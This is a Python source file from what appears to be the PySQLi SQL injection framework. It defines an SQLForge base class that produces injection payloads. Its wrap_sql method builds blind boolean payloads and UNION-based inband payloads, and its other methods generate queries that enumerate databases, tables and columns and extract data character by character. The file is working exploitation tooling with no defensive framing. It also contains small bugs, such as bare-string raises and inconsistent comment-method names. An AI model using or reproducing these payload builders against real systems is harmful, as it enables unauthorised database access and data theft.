#-*- coding: utf-8 -*-

## SQLForge allows specific SQL querys crafting.
# This class provides a flexible way to generate DBMS compliant SQL syntax.
#
# The basic forge can be derivated in order to override some functions, thus patching
# the lacks and errors it could contain for a given DBMS. Every DBMS plugin contained
# in PySQLi derives an SQL forge from this class and overrides some methods.
# 
# Note that many methods MUST be overriden in order for the derivated class to work
# properly.

class SQLForge:
    
    ## Constructor
    # @param context Context object providing all the required settings
    
    def __init__(self, context):
        self.context = context
    
    
    ## Wrap a string based on the current context
    # This method wraps a string and encode it if the current context requires it
    #
    # @param sql String to wrap
    # @return Wrapped (and if required encoded) string
    
    def wrap_string(self, sql):
        if self.context.require_string_encoding():
            out = 'CHAR('
            for car in sql:
                out += str(ord(car))+','
            out = out[:-1] + ')'
        else:
            return "%c%s%c" % (self.context.get_string_delimiter(),sql,self.context.get_string_delimiter())
        return out


    ## Wrap SQL query to fit in the selected injection mode
    # This is a part of the "magic" of PySQLi, SQL injection is performed based on the current context
    # 
    # @param sql SQL query to wrap (prepare for injection)
    # @return Vulnerable parameter value ready to be injected
        
    def wrap_sql(self, sql):
        q = self.context.get_string_delimiter()
        if self.context.is_blind():
            if self.context.require_truncate():
                if self.context.in_string():
                    return "%c OR (%s=%s) %s" % (q,sql,self.wrap_field(self.context.get_default_value()),self.context.get_comment())
                elif self.context.in_int():
                    return "%s OR (%s)=%s %s" % (self.context.get_default_value(), sql, self.wrap_field(self.context.get_default_value()), self.context.getComment())
            else:
                if self.context.in_string():
                    return "%c OR (%s=%s) AND %c1%c=%c1" % (q,sql,self.wrap_field(self.context.get_default_value()),q,q,q)
                elif self.context.in_int():
                    return "%s OR (%s)=%s " % (self.context.get_default_value(), sql,self.wrap_field(self.context.get_default_value()))
        else:
            # no matter if truncate is set or not, inband injection requires truncation
            if self.context.in_string():
                return "%c AND 1=0 UNION %s %s" % (q, sql, self.context.getComment())
            elif self.context.in_int():
                return "%s AND 1=0 UNION %s %s" % (self.context.get_default_value(), sql, self.context.get_comment())


    ## Wrap a given field
    # Field wrapping is done by adding a leading and trailing string delimiter if the target parameter is a string,
    # or by simply returning it if the target parameter is an integer
    # 
    # @param field Field to wrap
    # @return Wrapped field

    def wrap_field(self,field):
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s%c" % (q,field,q)
        else:
            return "%s"%field

    def wrap_ending_field(self, field):
        q = self.context.get_string_delimiter()
        if self.context.in_string():
            return "%c%s" % (q,field)
        else:
            return "%s"%field


    ## Basic SQL string length code
    # This method is used to generate a piece of SQL returning the number of characters of a given string
    #
    # @param string String to use for character count (can be SQL)
    # @return Piece of SQL query that can be used further
    
    def string_len(self, string):
        return "LENGTH(%s)" % string

    
    ## Basic SQL substring
    # Generate a piece of SQL returning a single character of a string
    #
    # @param string Target string (can be SQL)
    # @param pos Character position, starting from 0
    # @return Piece of SQL query 

    def get_char(self,string,pos):
        return "SUBSTRING(%s,%d,1)" % (string,pos)


    ## Basic SQL string concatenation
    # Generate a piece of SQL returning the result of str1+str2
    #
    # @param str1 First string to concatenate
    # @param str2 Second string to concatenate
    # @return Piece of SQL query
        
    def concat_str(self, str1, str2):
        return "CONCAT(%s,%s)" % (str1, str2)

    
    ## Basic SQL ascii code
    # You got the idea ...
    #
    # @param char Character (can be SQL)
    # @return SQL query returning the ascii code of the given character    
    
    def ascii(self, char):
        return "ASCII(%s)" % char


    ## Basic SQL count
    # Counts the number of records returned by a subquery
    #
    # @param records Records to count (can be SQL)
    # @return Piece of SQL query    
    
    def count(self, records):
        sql= "(SELECT COUNT(*) FROM (%s) AS T1)" % records
        return sql


    ## Basic SQL limit
    # Return only the n-th record from a set of records
    #
    # @param records Set of records (can be SQL)
    # @return Piece of SQL query

    def take(self,records, index):
        return "(%s LIMIT %d,1)" % (records, index)


    ## Basic SELECT * SQL query
    # Return every records of a given table from a given database
    #
    # @param table Target table
    # @param db Target database
    # @return Piece of SQL query

    def select_all(self, table, db):
        return "(SELECT * FROM %s.%s)" % (db, table)


    ## Basic record field read
    # Return the content of a given field from a given table for a given database
    #
    # @param field Field name (must be a string)
    # @param db Target database
    # @param table Target table
    # @param pos Record index
    # @return Piece of SQL query
    
    def get_table_field_record(self, field, table, db, pos):
        return "(SELECT %s FROM (SELECT * FROM %s.%s) as t0 LIMIT %d,1)"%(field,db,table,pos)


    ## Basic SQL condition check
    # Create a piece of SQL query based on a given SQL condition
    #
    # @param val Expression to compare (can be SQL)
    # @param cmp integer value to compare to
    # @return Piece of SQL query
    
    def forge_cdt(self, val, cmp):
        return "(%s)<%d" % (val,cmp)


    ## Basic inband SELECT query builder
    # This method is only used to generate SELECT requests for inband injection, to use with
    # the UNION operator
    #
    # @param sql SQL query to embed
    # @return Piece of SQL query

    def forge_second_query(self, sql):
        query = 'SELECT '
        columns= []        
        fields = self.context.get_inband_fields()
        tag = self.context.get_inband_tag()
        for i in range(len(fields)):
            if i==self.context.get_inband_target():
                columns.append(self.concat_str(self.wrap_string(tag),self.concat_str(sql, self.wrap_string(tag))))
            else:
                if fields[i]=='s':
                    columns.append(self.wrap_string('0'))
                elif fields[i]=='i':
                    columns.append('0')        
        return query + ','.join(columns)


    ## Get version string
    # MUST be overriden
    #
    # @return Piece of SQL query

    def get_version(self):
        raise 'You must provide the getVersion() method.'


    ## Get username
    # Generate a piece of SQL returning the current username
    #
    # @return Piece of SQL

    def get_user(self):
        return 'username()'

    ## Get current database
    # Generate a piece of SQL returning the current database name as a string
    #
    # @return Piece of SQL

    def get_current_database(self):
        return 'database()'

    ## Get all known databases (enumeration)
    # MUST be overriden
    #
    # @return Piece of SQL
            
    def get_databases(self):
        raise 'You must define the "getDatabases" function.'

    def get_database(self, id):
        return self.take(self.get_databases(), id)

    ## Count databases
    # This method should not be overriden
    #
    # @return Piece of SQL
            
    def get_nb_databases(self):
        return self.count(self.get_databases())



    ## Get database name string
    # This method should not be overriden
    #
    # @param id Database index
    # @return Piece of SQL
        
    def get_database_name(self, id):
        return self.take(self.get_databases(),id)


    ## Get all known tables(enumeration)
    # MUST be overriden
    #
    # @param db Target database name
    # @return Piece of SQL

    def get_tables(self,db):
        raise 'You must provide the getTables() method.'


    ## Count tables
    # This method should not be overriden
    #
    # @param db Target database name
    # @return Piece of SQL

    def get_nb_tables(self,db):
        return self.count(self.get_tables(db))


    ## Get table name 
    # This method should not be overriden
    #
    # @param db Target database name
    # @param id Table id
    # @return Piece of SQL
        
    def get_table_name(self, id, db):
        return self.take(self.get_tables(db), id)


    ## Get all known fields (enumeration)
    # MUST be overriden
    #
    # @param db Target database name
    # @param table Target table name
    # @return Piece of SQL

    def get_fields(self, table, db):
        raise 'You must provide the getFields() method.'


    ## Count fields
    # This method should not be overriden
    #
    # @param db Target database name
    # @param table target table name
    # @return Piece of SQL

    def get_nb_fields(self, table, db):
        return self.count(self.get_fields(table,db))


    ## Get field name 
    # This method should not be overriden
    #
    # @param db Target database name
    # @param table Target table name
    # @param id Table id
    # @return Piece of SQL
        
    def get_field_name(self, table, id, db):
        return self.take(self.get_fields(table, db), id)
        
    ## Get string length
    # This method should not be overriden
    #    
    # @param sql Target string (can be SQL)
    # @return String length 
    
    def get_string_len(self, sql):
        return self.string_len(sql)


    ## Get string character
    # This method should not be overriden
    # 
    # @param sql Target string (can be SQL)
    # @param pos Cahracter position
    # @return Ascii code of the given character 
    
    def get_string_char(self, sql, pos):
        return self.ascii(self.get_char(sql, pos))
